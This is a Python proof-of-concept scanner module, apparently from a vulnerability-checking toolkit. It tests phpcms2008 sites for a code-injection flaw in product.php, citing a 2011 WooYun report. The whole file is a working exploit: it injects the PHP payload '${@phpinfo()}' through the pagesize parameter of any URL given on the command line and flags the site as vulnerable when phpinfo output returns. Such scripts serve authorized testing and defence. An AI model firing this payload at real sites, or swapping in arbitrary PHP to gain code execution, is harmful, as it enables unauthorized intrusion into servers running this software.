#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpcms2008 product.php 代码执行
referer: http://www.wooyun.org/bugs/WooYun-2011-02984
author: Lucifer
description: 文件product.php中,参数pagesize存在代码注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class phpcms_product_code_exec_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/yp/product.php?pagesize=${@phpinfo()}"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=4, verify=False)
            if r"Configuration File (php.ini) Path" in req.text:
                cprint("[+]存在phpcms2008 product.php 代码执行漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True, vulnurl, "phpcms2008 product.php 代码执行", payload, req.text
            else:
                cprint("[-]不存在phpcms_product_code_exec漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = phpcms_product_code_exec_BaseVerify(sys.argv[1])
    testVuln.run()